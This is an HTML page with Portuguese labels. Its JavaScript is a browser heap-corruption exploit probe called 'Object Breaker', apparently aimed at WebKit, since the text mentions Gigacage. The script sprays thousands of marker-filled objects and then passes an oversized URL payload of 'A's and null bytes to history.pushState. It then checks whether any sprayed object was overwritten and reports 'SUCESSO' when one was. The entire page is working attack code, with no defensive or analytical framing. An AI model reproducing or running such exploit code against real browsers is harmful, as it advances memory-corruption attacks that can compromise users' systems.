<!DOCTYPE html>
<html>
<head>
    <title>Object Breaker: New Target</title>
    <style>
        body { background: #200; color: #fa0; font-family: monospace; padding: 20px; }
        .log { border: 1px solid #fa0; height: 350px; overflow-y: scroll; padding: 10px; background: #100; color: #fff; margin-bottom: 15px;}
        button { 
            padding: 20px; width: 100%; font-size: 20px; font-weight: bold; 
            cursor: pointer; border: 2px solid #fa0; 
            background: #410; color: #fa0; transition: 0.2s;
        }
        button:hover { background: #fa0; color: #000; }
    </style>
</head>
<body>
    <h1>OBJECT BREAKER</h1>
    <p>Alvo: Objetos JS Puros (Sem Gigacage)</p>
    <p>Base: 709518 | Payload: 64 Bytes de ZEROS</p>

    <button onclick="runObjectTest()">INICIAR ATAQUE A OBJETOS</button>

    <div id="logger" class="log">Aguardando...</div>

    <script>
        const logger = document.getElementById('logger');
        const BASE_SIZE = 709518; 
        const MAGIC = 0x41414141; // 1094795585 em decimal
        const SPRAY_SIZE = 15000;

        var spray = [];

        function log(msg, type) {
            const d = document.createElement('div');
            d.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
            if(type) d.style.color = type;
            logger.appendChild(d);
            logger.scrollTop = logger.scrollHeight;
        }

        async function runObjectTest() {
            log("---------------------------------------");
            log("TROCANDO ALVO: De Uint32Array para Object {...}");

            spray = null;
            if(window.gc) window.gc();
            await new Promise(r => setTimeout(r, 300));
            spray = [];

            // 1. SPRAY DE OBJETOS REAIS
            // Objetos simples ficam no Heap "Normal", junto com as Strings.
            for(let i=0; i < SPRAY_SIZE; i++) {
                // Criamos um objeto com propriedades INLINE
                let obj = {
                    id: i,           // Pra saber quem é
                    a: MAGIC,        // Marcador 1
                    b: MAGIC,        // Marcador 2
                    c: 0xDEADBEEF    // Marcador 3
                };
                spray.push(obj);
            }

            log("Objetos alocados. Estabilizando...");
            await new Promise(r => setTimeout(r, 1000));

            try {
                // 2. INJEÇÃO
                // Base + 64 bytes de zeros
                let base = new Array(BASE_SIZE + 1).join('A');
                let overflow = new Array(65).join('\x00');
                let payload = base + overflow;

                history.pushState({}, "pwn_" + Date.now(), payload);
                
                // 3. VERIFICAÇÃO
                checkObjects();

            } catch(e) {
                log("ERRO: " + e.message, "red");
            }
        }

        function checkObjects() {
            let found = false;
            // Varredura reversa
            for(let i = spray.length - 1; i >= 0; i--) {
                let obj = spray[i];
                
                if(obj) {
                    // Verificamos se as propriedades mudaram
                    // Se sobrescrevermos com Zeros, obj.a vai virar 0 ou undefined
                    
                    if(obj.a !== MAGIC || obj.b !== MAGIC) {
                        found = true;
                        document.body.style.background = "#0f0";
                        
                        let msg = `SUCESSO! Objeto [${i}] Corrompido!`;
                        msg += `\nOriginal: ${MAGIC}`;
                        msg += `\nLido A: ${obj.a}`;
                        msg += `\nLido B: ${obj.b}`;
                        
                        alert(msg);
                        return;
                    }
                    
                    // Checagem de Identidade (Se o ID mudar, corrompeu também)
                    if(obj.id !== i) {
                        found = true;
                        alert(`SUCESSO! ID Corrompido no index ${i}. Leu: ${obj.id}`);
                        return;
                    }
                }
            }
            if(!found) log("Nenhum objeto afetado. Tente aumentar o overflow (botão Void Walker) com esses objetos.");
        }
    </script>
</body>
</html>
